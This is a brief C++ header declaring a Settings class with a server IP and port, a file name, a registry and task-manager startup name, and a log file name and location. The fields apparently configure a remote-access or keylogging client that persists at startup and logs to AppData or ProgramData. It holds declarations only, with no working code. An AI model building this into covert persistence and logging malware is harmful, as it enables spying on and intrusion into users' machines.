#pragma once

#ifndef SETTINGS_H
#define SETTINGS_H

#include <string>
#include <Windows.h>



class Settings
{
public:
	static const char* serverIP;
	static int serverPort;

	static std::string fileName;		//file name
	static std::string startupName;		//startup name in registry / taskmgr
	static std::string logFileName;		//log file name
	static std::string logFileLocation; //log file location (appdata, programdata etc)

};

#endif // !SETTINGS_H